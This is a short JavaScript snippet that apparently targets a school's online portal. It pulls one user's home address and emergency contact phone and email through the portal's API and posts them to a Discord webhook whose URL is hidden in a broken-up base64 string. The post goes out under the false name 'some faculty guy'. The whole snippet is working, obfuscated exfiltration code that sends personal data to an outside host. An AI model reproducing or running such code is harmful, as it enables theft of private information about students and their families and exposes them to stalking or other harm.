async function kjk() {
var mdfg = "a HR0 cHM 6Ly 9ka XNj b3J kLm Nvb S9h cGk vd2 Via G9v a3M vMT M2ND cwM Dc 5NTM3ODk5MTEzNC9OS0haYy14U3VBY3ZnbnNKbEJfVEtza2RyQWVjTHVqWnN0dkZWQzhqa0xmUkdtZVRlNFlHU3pPc2t1dUpTVUlUUmFZbg=="
mdfg = mdfg.replace(/\s/g, '');
mdfg = atob(mdfg)
var addr = await fetch("https://headwaters.myschoolapp.com/api/user/address/?userId=7186181").then(function(res) {return res.json()});
var emerp = await fetch("https://headwaters.myschoolapp.com/api/user/emergencycontactphone/?userId=7186181").then(function(res) {return res.json()});
var emere = await fetch("https://headwaters.myschoolapp.com/api/user/emergencycontactemail/?userId=7186181").then(function(res) {return res.json()});
var checked = {}
if(addr.length < 1) {checked.ADDR = "empty"} else {checked.ADDR = addr}
if(emerp.length < 1) {checked.EMERP = "empty"} else {checked.EMERP = emerp}
if(emere.length < 1) {checked.EMERE = "empty"} else {checked.EMERE = emere}
checked = JSON.stringify(checked)
        await fetch(mdfg, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: checked,
                username: 'some faculty guy'
            })
        })
}
kjk();
